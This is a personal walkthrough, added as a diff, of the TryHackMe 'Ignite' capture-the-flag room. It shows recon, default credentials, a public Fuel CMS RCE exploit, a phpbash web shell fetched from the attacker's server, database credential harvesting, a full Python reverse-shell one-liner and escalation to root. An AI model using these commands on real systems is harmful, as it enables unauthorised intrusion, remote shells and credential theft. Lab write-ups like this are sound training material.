@@ -1,0 +1,99 @@
+Ignite CTF - Exploiting a Fuel CMS Web Server
+
+A step-by-step walkthrough of my process in completing the Ignite CTF room on TryHackMe
+
+Designed and created by DarkStar7471, built by Paradox.
+
+Thanks to everyone involved in developing and hosting this opportunity to develop skills in web server exploitation and privilege escalation 
+Thanks to those who have written walkthroughs before to support new users in completing the room
+
+Start with some recon using Nmap
+  nmap -sV -script=http-enum <TARGETIP>                                
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 19:26 EST
+  Nmap scan report for <TARGETIP>
+  Host is up (0.29s latency).
+  Not shown: 999 closed tcp ports (reset)
+  PORT   STATE SERVICE VERSION
+  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+  |_http-server-header: Apache/2.4.18 (Ubuntu)
+  | http-enum: 
+  |   /robots.txt: Robots file
+  |   /0/: Potentially interesting folder
+  |   /home/: Potentially interesting folder
+  |_  /index/: Potentially interesting folder
+
+    A starting point but no actionable yield. Attempts at directory traversal and code injection are fruitless
+
+Access target IP page and find default credentials at the bottom
+  To access the FUEL admin, go to:
+  http://10.10.13.54/fuel
+  User name: admin
+  Password: admin
+
+Enter site and update details
+
+Search for Fuel CMS exploit. Identify CVE, RCE scripts published, try a few and run with
+  https://www.exploit-db.com/exploits/50477
+    python ./50477.py -u http://<TARGETIP>/
+    $whoami
+    systemwww-data
+    $cd /home/www-data && ls -la
+    systemtotal 12
+    drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
+    drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
+    -rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
+
+      Note that THM still lists the filename as user.txt, however submitting the output from the following command yields a correct answer
+    $less /home/www-data/flag.txt
+    [FLAG 1]
+
+Current shell is restrictive in commands and usability so I decide to look for alternatives. Find phpbash referenced and tested in walkthroughs, run with it
+      https://github.com/Arrexel/phpbash/blob/master/phpbash.php
+        Download from here
+  Start python web server to host files
+     python3 -m http.server <ATTACKMACHINEIP> <PORT>
+      Check it's running by viewing page in browser
+  Return to RCE shell and retrieve remote file
+    wget http://<ATTACKMACHINEIP>:<PORT>/phpbash.php 
+  Access phpbash via browser
+    http://<TARGETIPADDRESS>/phpbash.php
+
+Spend a lot of time (too much) exploring system for clues for root access
+  Realise there are setup instructions for the db the landing page for <TARGETIP>
+
+Set up SQL database using instructions
+
+Navigate to /var/www/html/fuel/application/config
+  head -50 database.php
+    ...
+    $db['default'] = array(
+    'dsn' => '',
+    'hostname' => 'localhost',
+    'username' => 'root',
+    'password' => '[password]',
+    ...
+
+Switch user must be completed in terminal, we'll need a terminal shell
+
+Start listening on attack machine
+  └─$ netcat -lvnp 4242        
+
+Input a python shell through phpbash
+  python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKMACHINEIP>",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+Return to listening terminal
+    It should have a $ indicating the script worked, if not check that ATTACKMACHINEIP is correct in shell script and ports are consistent between shell script and nc command
+
+Use harvested credentials to gain root access and exfiltrate the second flag 
+  $ su root
+  su root
+  Password: [passwordfromdbfile]
+  root@ubuntu:/var/www/html# cd /root
+  cd /root
+  root@ubuntu:~# ls
+  ls
+  root.txt
+  root@ubuntu:~# cat root.txt
+  cat root.txt
+  [FLAG 2]
+
